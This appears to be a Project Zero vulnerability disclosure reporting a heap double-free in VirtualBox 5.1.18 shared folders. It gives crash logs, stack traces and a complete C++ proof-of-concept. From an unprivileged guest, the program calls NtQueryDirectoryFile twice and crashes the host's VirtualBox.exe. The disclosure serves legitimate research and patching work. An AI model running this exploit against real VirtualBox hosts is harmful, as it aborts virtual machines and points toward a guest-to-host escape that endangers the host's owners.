/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1227

We have discovered a heap double-free vulnerability in the latest version of VirtualBox (5.1.18), with Guest Additions (and more specifically shared folders) enabled in the guest operating system. The heap memory corruption takes place in the VirtualBox.exe process running on a Windows host (other host platforms were untested). It can be triggered from an unprivileged ring-3 process running in a Windows guest, by performing two nt!NtQueryDirectoryFile system calls [1] against a shared (sub)directory one after another: the first one with the ReturnSingleEntry argument set to FALSE, and the next one with ReturnSingleEntry=TRUE. During the second system call, a double free takes place and the VM execution is aborted.

We have confirmed that the vulnerability reproduces with Windows 7/10 32-bit as the guest, and Windows 7 64-bit as the host system, but haven’t checked other configurations. However, it seems very likely that the specific version of Windows as the guest/host is irrelevant.

It also seems important for reproduction that the shared directory being queried has some files (preferably a few dozen) inside of it. The attached Proof of Concept program (written in C++, can be compiled with Microsoft Visual Studio) works by first creating a dedicated directory in the shared folder (called “vbox_crash”), and then creating 16 files with ~128 byte long names, which appears to be sufficient to always trigger the bug. Finally, it invokes the nt!NtQueryDirectoryFile syscall twice, leading to a VM crash. While the PoC requires write access to the shared folder to set up reliable conditions, it is probably not necessary in practical scenarios, as long as the shared folder already contains some files (which is most often the case).

If we assume that the shared folder is mounted as drive E, we can start the PoC as follows:

>VirtualBoxKiller.exe E:\

Immediately after pressing "enter", the virtual machine should be aborted. The last two lines of the VBoxHardening.log file corresponding to the VM should be similar to the following:

--- cut ---
  3e28.176c: supR3HardNtChildWaitFor[2]: Quitting: ExitCode=0xc0000374 (rcNtWait=0x0, rcNt1=0x0, rcNt2=0x103, rcNt3=0x103, 4468037 ms, the end);
  1020.3404: supR3HardNtChildWaitFor[1]: Quitting: ExitCode=0xc0000374 (rcNtWait=0x0, rcNt1=0x0, rcNt2=0x103, rcNt3=0x103, 4468638 ms, the end);
--- cut ---

The 0xc0000374 exit code above translates to STATUS_HEAP_CORRUPTION. A summary of the crash and the corresponding stack trace is as follows:

--- cut ---
  1: kd> g
  Critical error detected c0000374
  Break instruction exception - code 80000003 (first chance)
  ntdll!RtlReportCriticalFailure+0x2f:
  0033:00000000`76f3f22f cc              int     3

  1: kd> kb
  RetAddr           : Args to Child                                                           : Call Site
  00000000`76f3f846 : 00000000`00000002 00000000`00000023 00000000`00000087 00000000`00000003 : ntdll!RtlReportCriticalFailure+0x2f
  00000000`76f40412 : 00000000`00001010 00000000`03a50000 00000000`00001000 00000000`00001000 : ntdll!RtlpReportHeapFailure+0x26
  00000000`76f42084 : 00000000`03a50000 00000000`05687df0 00000000`00000000 00000000`038d0470 : ntdll!RtlpHeapHandleError+0x12
  00000000`76eda162 : 00000000`05687de0 00000000`00000000 00000000`00000000 000007fe`efc8388b : ntdll!RtlpLogHeapFailure+0xa4
  00000000`76d81a0a : 00000000`00000000 00000000`03f0e1b0 00000000`111fdd40 00000000`00000000 : ntdll!RtlFreeHeap+0x72
  00000000`725a8d94 : 00000000`00000087 000007fe`efc3919b 00000000`08edf790 00000000`05661c00 : kernel32!HeapFree+0xa
  000007fe`efc58fef : 00000000`00000086 00000000`00001000 00000000`00000000 00000000`03f0e1b0 : MSVCR100!free+0x1c
  000007fe`f4613a96 : 00000000`05661d16 00000000`00000000 00000000`00000000 00000000`05687df0 : VBoxRT+0xc8fef
  000007fe`f4611a48 : 00000000`056676d0 00000000`08edf830 00000000`00000000 00000000`05661c98 : VBoxSharedFolders!VBoxHGCMSvcLoad+0x1686
  000007fe`ee885c22 : 00000000`111fdd30 00000000`111fdd30 00000000`03f352b0 00000000`0000018c : VBoxSharedFolders+0x1a48
  000007fe`ee884a2c : 00000000`00000000 00000000`111fdd30 00000000`00000000 00000000`00000000 : VBoxC!VBoxDriversRegister+0x48c62
  000007fe`efc13b2f : 00000000`05747fe0 00000000`00000da4 00000000`00000000 00000000`00000000 : VBoxC!VBoxDriversRegister+0x47a6c
  000007fe`efc91122 : 00000000`05737e90 00000000`05737e90 00000000`00000000 00000000`00000000 : VBoxRT+0x83b2f
  00000000`72561d9f : 00000000`05737e90 00000000`00000000 00000000`00000000 00000000`00000000 : VBoxRT+0x101122
  00000000`72561e3b : 00000000`725f2ac0 00000000`05737e90 00000000`00000000 00000000`00000000 : MSVCR100!endthreadex+0x43
  00000000`76d759bd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : MSVCR100!endthreadex+0xdf
  00000000`76eaa2e1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
  00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x1d
--- cut ---

When the "Heaps" option is enabled for VirtualBox.exe in Application Verifier, the crash is reported in the following way:

--- cut ---
  1: kd> g

  =======================================
  VERIFIER STOP 0000000000000007: pid 0xC08: Heap block already freed. 

    000000000DCB1000 : Heap handle for the heap owning the block.
    000000001C37E000 : Heap block being freed again.
    0000000000000000 : Size of the heap block.
    0000000000000000 : Not used


  =======================================
  This verifier stop is not continuable. Process will be terminated 
  when you use the `go' debugger command.

  =======================================

  1: kd> kb
  RetAddr           : Args to Child                                                           : Call Site
  000007fe`f42437ee : 00000000`00000000 00000000`1c37e000 000007fe`f42415a8 000007fe`f42520b0 : ntdll!DbgBreakPoint
  000007fe`f4249970 : 00000000`265cf5b8 00000000`00000007 00000000`0dcb1000 00000000`1c37e000 : vrfcore!VerifierStopMessageEx+0x772
  000007fe`f302931d : 00000000`1c186a98 00000000`00000000 00000000`265cf520 00100000`265cf520 : vrfcore!VfCoreRedirectedStopMessage+0x94
  000007fe`f3026bc1 : 00000000`0dcb1000 00000000`1c37e000 00000000`00000000 00000000`0dcb1000 : verifier!AVrfpDphReportCorruptedBlock+0x155
  000007fe`f3026c6f : 00000000`0dcb1000 00000000`1c37e000 00000000`0dcb1000 00000000`00002000 : verifier!AVrfpDphFindBusyMemoryNoCheck+0x71
  000007fe`f3026e45 : 00000000`1c37e000 00000000`00000000 00000000`01001002 00000000`1717ed08 : verifier!AVrfpDphFindBusyMemory+0x1f
  000007fe`f302870e : 00000000`1c37e000 00000000`00000000 00000000`01001002 00000000`0dcb1038 : verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x25
  00000000`76f440d5 : 00000000`00000000 00000000`00000000 00000000`00001000 00000000`00000000 : verifier!AVrfDebugPageHeapFree+0x8a
  00000000`76ee796c : 00000000`0dcb0000 00000000`00000000 00000000`0dcb0000 00000000`00000000 : ntdll!RtlDebugFreeHeap+0x35
  00000000`76d81a0a : 00000000`0dcb0000 000007fe`efc41b01 00000000`00000000 00000000`1c37e000 : ntdll! ?? ::FNODOBFM::`string'+0xe982
  00000000`725a8d94 : 00000000`00000087 000007fe`efc3919b 00000000`265cfb10 00000000`1c341f00 : kernel32!HeapFree+0xa
  000007fe`efc58fef : 00000000`00000086 00000000`00001000 00000000`00000000 00000000`67e40fe0 : MSVCR100!free+0x1c
  000007fe`f4923a96 : 00000000`1c342076 00000000`00000000 00000000`00000000 00000000`1c37e000 : VBoxRT+0xc8fef
  000007fe`f4921a48 : 00000000`5c774ff0 00000000`265cfbb0 00000000`00000000 00000000`1c341ff8 : VBoxSharedFolders!VBoxHGCMSvcLoad+0x1686
  000007fe`ee595c22 : 00000000`63097f60 00000000`63097f60 00000000`25f81f30 00000000`0000018c : VBoxSharedFolders+0x1a48
  000007fe`ee594a2c : 00000000`00000000 00000000`63097f60 00000000`00000000 00000000`00000000 : VBoxC!VBoxDriversRegister+0x48c62
  000007fe`efc13b2f : 00000000`25339730 00000000`000004c8 00000000`00000000 00000000`1dce4d30 : VBoxC!VBoxDriversRegister+0x47a6c
  000007fe`efc91122 : 00000000`1dce4d30 00000000`1dce4d30 00000000`00000000 00000000`00000000 : VBoxRT+0x83b2f
  00000000`72561d9f : 00000000`1dce4d30 00000000`00000000 00000000`00000000 00000000`00000000 : VBoxRT+0x101122
  00000000`72561e3b : 00000000`725f2ac0 00000000`1dce4d30 00000000`00000000 00000000`00000000 : MSVCR100!endthreadex+0x43
  00000000`76d759bd : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : MSVCR100!endthreadex+0xdf
  00000000`76eaa2e1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
  00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x1d
--- cut ---

Due to the nature of the flaw (heap memory corruption), it could potentially make it possible for an unprivileged guest program to escape the VM and execute arbitrary code on the host, hence we consider it to be a high-severity issue.

References:
[1] ZwQueryDirectoryFile routine, https://msdn.microsoft.com/en-us/library/windows/hardware/ff567047(v=vs.85).aspx
*/

#include <Windows.h>
#include <winternl.h>

#include <cstdio>
#include <time.h>

extern "C"
NTSTATUS WINAPI NtQueryDirectoryFile(
  _In_     HANDLE                 FileHandle,
  _In_opt_ HANDLE                 Event,
  _In_opt_ PIO_APC_ROUTINE        ApcRoutine,
  _In_opt_ PVOID                  ApcContext,
  _Out_    PIO_STATUS_BLOCK       IoStatusBlock,
  _Out_    PVOID                  FileInformation,
  _In_     ULONG                  Length,
  _In_     FILE_INFORMATION_CLASS FileInformationClass,
  _In_     BOOLEAN                ReturnSingleEntry,
  _In_opt_ PUNICODE_STRING        FileName,
  _In_     BOOLEAN                RestartScan
);

typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG         NextEntryOffset;
  ULONG         FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG         FileAttributes;
  ULONG         FileNameLength;
  WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

int main(int argc, char **argv) {
  // Validate command line format.
  if (argc != 2) {
    printf("Usage: %s <path to a writable shared folder>\n", argv[0]);
    return 1;
  }

  // Initialize the PRNG.
  srand((unsigned int)time(NULL));

  // Create a subdirectory dedicated to demonstrating the vulnerability.
  CHAR TmpDirectoryName[MAX_PATH];
  _snprintf_s(TmpDirectoryName, sizeof(TmpDirectoryName), "%s\\vbox_crash", argv[1]);

  if (!CreateDirectoryA(TmpDirectoryName, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
    printf("CreateDirectory failed, %d\n", GetLastError());
    return 1;
  }

  // Create 16 files with long (128-byte) names, which appears to always be sufficient to trigger the bug.
  CONST UINT kTempFilesCount = 16;
  CONST UINT kTempFilenameLength = 128;
  CHAR TmpFilename[kTempFilenameLength + 1], TmpFilePath[MAX_PATH];

  memset(TmpFilename, 'A', kTempFilenameLength);
  TmpFilename[kTempFilenameLength] = '\0';

  for (UINT i = 0; i < kTempFilesCount; i++) {
    _snprintf_s(TmpFilePath, sizeof(TmpFilePath), "%s\\%s.%u", TmpDirectoryName, TmpFilename, rand());
    HANDLE hFile = CreateFileA(TmpFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
      printf("CreateFile#1 failed, %d\n", GetLastError());
      return 1;
    }

    CloseHandle(hFile);
  }
  
  // Open the temporary directory.
  HANDLE hDirectory = CreateFileA(TmpDirectoryName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
  if (hDirectory == INVALID_HANDLE_VALUE) {
    printf("CreateFile#2 failed, %d\n", GetLastError());
    return 1;
  }

  IO_STATUS_BLOCK iosb;
  FILE_DIRECTORY_INFORMATION fdi;

  // Perform the first call, with ReturnSingleEntry set to FALSE.
  NtQueryDirectoryFile(hDirectory, NULL, NULL, NULL, &iosb, &fdi, sizeof(fdi), FileDirectoryInformation, FALSE, NULL, TRUE);

  // Now make the same call, but with ReturnSingleEntry=TRUE. This should crash VirtualBox.exe on the host with a double-free exception.
  NtQueryDirectoryFile(hDirectory, NULL, NULL, NULL, &iosb, &fdi, sizeof(fdi), FileDirectoryInformation, TRUE, NULL, TRUE);

  // We should never reach here.
  CloseHandle(hDirectory);

  return 0;
}
